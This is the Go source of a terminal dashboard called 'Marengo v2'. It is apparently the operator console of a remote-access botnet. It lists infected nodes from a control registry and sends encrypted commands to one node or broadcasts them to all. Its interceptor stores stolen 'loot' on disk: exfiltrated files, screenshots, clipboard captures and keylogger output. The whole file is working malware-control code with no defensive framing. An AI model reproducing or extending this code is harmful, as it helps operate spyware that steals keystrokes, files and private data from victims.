package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

// --- GLOBALS ---
var (
	app           = tview.NewApplication()
	targetList    = tview.NewList().ShowSecondaryText(false)
	outputView    = tview.NewTextView().SetDynamicColors(true).SetWordWrap(true).SetChangedFunc(func() { app.Draw() })
	commandInput  = tview.NewInputField().SetLabel("Command: ").SetFieldWidth(0)
	currentSecret string
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"` // Must match the Brain's decoder!
	Listen   string `json:"listen"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

func main() {
	// 1. THE LOGIN FORM
	loginForm := tview.NewForm().
		AddPasswordField("Tenant Secret", "", 20, '*', func(text string) { currentSecret = text }).
		AddButton("Login", func() {
			if strings.TrimSpace(currentSecret) != "" {
				setupDashboard()
			}
		})
	loginForm.SetBorder(true).SetTitle(" Marengo Login ").SetTitleAlign(tview.AlignCenter)

	if err := app.SetRoot(loginForm, true).Run(); err != nil {
		panic(err)
	}
}

func setupDashboard() {
	// --- THE FREEDOM MOVE ---
	// Disables TUI mouse capture so you can hover, drag, and right-click to copy.
	app.EnableMouse(false)

	// 1. THE HEADER
	header := tview.NewTextView().
		SetTextAlign(tview.AlignCenter).
		SetDynamicColors(true).
		SetText("[black:green] Marengo v2 [-] [white]| TAB: Switch Focus | PgUp/PgDn: Scroll Console | Arrows: Select Ghost [-]")

	// 2. THE TARGET LIST (Sidebar)
	targetList.SetBorder(true).
		SetTitle(" 🛰️ ORBITAL NODES ").
		SetTitleAlign(tview.AlignLeft).
		SetBorderColor(tcell.ColorDeepSkyBlue)
	targetList.SetSelectedBackgroundColor(tcell.ColorDarkSlateGray)
	targetList.AddItem("ALL (Broadcast)", "Global Blast", 'a', nil)

	// 3. THE OUTPUT CONSOLE (Main View)
	outputView.SetBorder(true)
	outputView.SetTitle(" 📟 SYSTEM LOG ")
	outputView.SetBorderColor(tcell.ColorGreen)
	outputView.SetBackgroundColor(tcell.ColorBlack)
	outputView.SetDynamicColors(true) // This will work now!
	outputView.SetWordWrap(true)

	// 4. THE INPUT FIELD (Action Bar)
	commandInput.SetLabel(" [green]λ[-] ").
		SetLabelColor(tcell.ColorGreen).
		SetFieldBackgroundColor(tcell.ColorBlack).
		SetFieldTextColor(tcell.ColorWhite).
		SetBorder(true).
		SetTitle(" COMMAND INPUT ").
		SetBorderColor(tcell.ColorDarkSlateGray)

	// --- 🔑 THE 3-WAY FOCUS LOGIC (The Secret Sauce) ---
	// TAB moves: List -> Console -> Input -> List
	targetList.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyTab {
			app.SetFocus(outputView)
			return nil
		}
		return event
	})

	outputView.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyTab {
			app.SetFocus(commandInput)
			return nil
		}
		// Allows arrows to work for scrolling even if mouse is disabled
		return event
	})

	commandInput.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyTab {
			app.SetFocus(targetList)
			return nil
		}
		return event
	})

	// 5. AUTO-SCROLL LOGIC
	outputView.SetChangedFunc(func() {
		outputView.ScrollToEnd()
		app.Draw()
	})

	// 6. BACKGROUND REFRESH
	go func() {
		for {
			t := fetchTargets()
			app.QueueUpdateDraw(func() {
				currIdx := targetList.GetCurrentItem()
				var selectedName string
				if currIdx >= 0 && currIdx < targetList.GetItemCount() {
					selectedName, _ = targetList.GetItemText(currIdx)
				}

				targetList.Clear()
				targetList.AddItem("ALL (Broadcast)", "Global Blast", 'a', nil)

				newIdx := 0
				for i, name := range t {
					targetList.AddItem(name, "Active Node", 0, nil)
					if name == selectedName {
						newIdx = i + 1
					}
				}
				if newIdx < targetList.GetItemCount() {
					targetList.SetCurrentItem(newIdx)
				} else {
					targetList.SetCurrentItem(0)
				}
			})
			time.Sleep(3 * time.Second)
		}
	}()

	// 7. LAYOUT ASSEMBLY
	mainBody := tview.NewFlex().
		AddItem(targetList, 30, 1, false).
		AddItem(tview.NewFlex().SetDirection(tview.FlexRow).
			AddItem(outputView, 0, 1, false).
			AddItem(commandInput, 3, 1, true), 0, 2, true)

	finalLayout := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(header, 1, 1, false).
		AddItem(mainBody, 0, 1, true)

	// 8. INPUT HANDLING
	commandInput.SetDoneFunc(func(key tcell.Key) {
		if key == tcell.KeyEnter {
			cmd := strings.TrimSpace(commandInput.GetText())
			if cmd == "" {
				return
			}

			idx := targetList.GetCurrentItem()
			targetName, _ := targetList.GetItemText(idx)

			if cmd == "clear" {
				outputView.Clear()
				commandInput.SetText("")
				return
			}

			fmt.Fprintf(outputView, "\n[yellow]▼ COMMAND:[-] [white]%s[-] [yellow]→[-] [cyan]%s[-]\n", cmd, targetName)

			go func(target, command string) {
				if target == "ALL (Broadcast)" {
					broadcastCommand(command)
				} else {
					res := executeRotatingCommand(target, command)
					fmt.Fprintf(outputView, "[green]┌── RESPONSE (%s)───[-]\n[white]%s[-]\n[green]└────────────────────[-]\n", target, res)
				}
				app.Draw()
			}(targetName, cmd)

			commandInput.SetText("")
		}
	})

	app.SetRoot(finalLayout, true).SetFocus(commandInput)
}

// --- NETWORK LOGIC ---

func fetchTargets() []string {
	c, err := net.DialTimeout("tcp", "127.0.0.1:8080", 2*time.Second)
	if err != nil {
		return nil
	}
	defer c.Close()
	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_list", Key: currentSecret})
	var t []string
	json.NewDecoder(c).Decode(&t)
	return t
}

func executeRotatingCommand(id, cmd string) string {
	// 1. ROUTE REQUEST
	c, err := net.DialTimeout("tcp", "127.0.0.1:8080", 2*time.Second)
	if err != nil {
		return "[red]Registry Unreachable[-]"
	}
	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_req", TargetID: id, Key: currentSecret})
	var r RoutingInfo
	json.NewDecoder(c).Decode(&r)
	c.Close()
	if r.RelayAddr == "" {
		return "[red]Pin Lost[-]"
	}

	// 2. CONNECT
	time.Sleep(200 * time.Millisecond)
	conn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
	if err != nil {
		return "[red]Relay Refused[-]"
	}
	defer conn.Close()

	// 3. KEY INJECTION
	sessionKey := generateSessionKey()
	conn.Write(sessionKey)

	// 4. SEND COMMAND
	enc, _ := encryptPayload(cmd, sessionKey)
	fmt.Fprintf(conn, "%s\n", enc)

	// 5. RECEIVE & INTERCEPT
	conn.SetReadDeadline(time.Now().Add(15 * time.Second)) // Increased for file transfers
	reply, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return "[red]Timeout/Relay Closed[-]"
	}

	p, err := decryptPayload(strings.TrimSpace(reply), sessionKey)
	if err != nil {
		return "[red]Decryption Failure[-]"
	}

	// --- SMART LOOT INTERCEPTOR ---
	if strings.HasPrefix(p, "FILE_DATA:") {
		// Remove prefix and split the filename from the data
		payload := strings.TrimPrefix(p, "FILE_DATA:")
		parts := strings.SplitN(payload, "|", 2)

		if len(parts) < 2 {
			return "[red]Loot Error: Malformed Packet[-]"
		}

		originalName := parts[0]
		encodedData := parts[1]

		rawData, err := base64.StdEncoding.DecodeString(encodedData)
		if err != nil {
			return "[red]Loot Corruption: Base64 Fail[-]"
		}

		os.MkdirAll("loot", 0755)

		// Save using the original name, but prefixed with the TargetID to avoid overwrites
		savePath := fmt.Sprintf("loot/%s_%s", id, originalName)

		err = os.WriteFile(savePath, rawData, 0644)
		if err != nil {
			return fmt.Sprintf("[red]Disk Error: %v[-]", err)
		}

		return fmt.Sprintf("[black:green] 💰 LOOT SECURED [-] [green]Saved as %s (%d bytes)[-]", savePath, len(rawData))
	}
	// --- SNAP/LOOT INTERCEPTOR ---
	if strings.HasPrefix(p, "SNAP_DATA:") || strings.HasPrefix(p, "FILE_DATA:") {
		isSnap := strings.HasPrefix(p, "SNAP_DATA:")
		encoded := ""
		extension := ".bin"

		if isSnap {
			encoded = strings.TrimPrefix(p, "SNAP_DATA:")
			extension = ".png"
		} else {
			encoded = strings.TrimPrefix(p, "FILE_DATA:")
		}

		rawData, _ := base64.StdEncoding.DecodeString(encoded)
		os.MkdirAll("loot", 0755)
		fileName := fmt.Sprintf("loot/%s_%d%s", id, time.Now().Unix(), extension)
		os.WriteFile(fileName, rawData, 0644)

		prefix := "💰 LOOT"
		if isSnap {
			prefix = "📸 SNAP"
		}
		return fmt.Sprintf("[black:green] %s SECURED [-] [green]Saved to %s[-]", prefix, fileName)
	}
	// If the response contains our sysinfo headers, colorize it!
	if strings.Contains(p, "[+] IDENT:") {
		p = strings.ReplaceAll(p, "[+]", "[cyan][+][-]")
		p = strings.ReplaceAll(p, "ADMIN/SYSTEM", "[red]ADMIN/SYSTEM[-]")

	}
	if strings.Contains(p, "--- [CLIPBOARD SNATCH] ---") {
		os.MkdirAll("loot/clips", 0755)
		clipFile := fmt.Sprintf("loot/clips/%s_clips.txt", id)

		f, _ := os.OpenFile(clipFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		f.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), p))
		f.Close()

		return "[cyan]📋 CLIPBOARD SNATCHED [-] [green]Log updated: " + clipFile + "[-]\n" + p
	}
	if strings.Contains(p, "--- [KEYLOG REPORT] ---") {
		os.MkdirAll("loot/logs", 0755)
		logFile := fmt.Sprintf("loot/logs/%s_keys.txt", id)

		// Append to the file so you don't lose old data
		f, _ := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		f.WriteString(p + "\n")
		f.Close()

		return "[yellow]🔑 KEYLOG CAPTURED [-] [green]Saved to " + logFile + "[-]\n" + p
	}
	return p
}

func broadcastCommand(cmd string) {
	targets := fetchTargets()
	fmt.Fprintf(outputView, "[blue][!] Blasting to %d targets...[-]\n", len(targets))
	var wg sync.WaitGroup
	for _, id := range targets {
		wg.Add(1)
		go func(tid string) {
			defer wg.Done()
			res := executeRotatingCommand(tid, cmd)
			fmt.Fprintf(outputView, "[white][%s]:[-] %s\n", tid, res)
		}(id)
	}
	wg.Wait()
	fmt.Fprintf(outputView, "[green][+++] Broadcast Complete.[-]\n")
}
